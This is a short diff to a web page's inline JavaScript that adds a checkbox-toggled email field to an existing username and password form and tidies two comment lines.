-            // Toggle input fields based on checkbox state
+            // ----- Toggle input fields based on checkbox state -----
             const usernameCheck = document.getElementById('username-check');
+            const emailCheck = document.getElementById('email-check');
             const password1Check = document.getElementById('password1-check');
             const password2Check = document.getElementById('password2-check');
 
             const usernameInput = document.querySelector('input[name="username"]');
+            const emailInput = document.querySelector('input[name="email"]');
             const password1Input = document.querySelector('input[name="password1"]');
             const password2Input = document.querySelector('input[name="password2"]');
 
@@ -712,6 +711,15 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
                     usernameInput.disabled = !this.checked;
                     if (!this.checked) {
                         usernameInput.value = '';
+                    }
+                });
+            }
+
+            if (emailCheck && emailInput) {
+                emailCheck.addEventListener('change', function() {
+                    emailInput.disabled = !this.checked;
+                    if (!this.checked) {
+                        emailInput.value = '';
                     }
                 });
             }
@@ -734,7 +742,7 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
                 });
             }
 
-            // Password confirmation validation
+            // ----- Password confirmation validation -----
             if (password1Input && password2Input) {
                 function checkPasswordMatch() {
                     if (password1Input.value && password2Input.value) {
@@ -756,5 +764,6 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             }
         });
     </script>
+
 </body>
 </html>
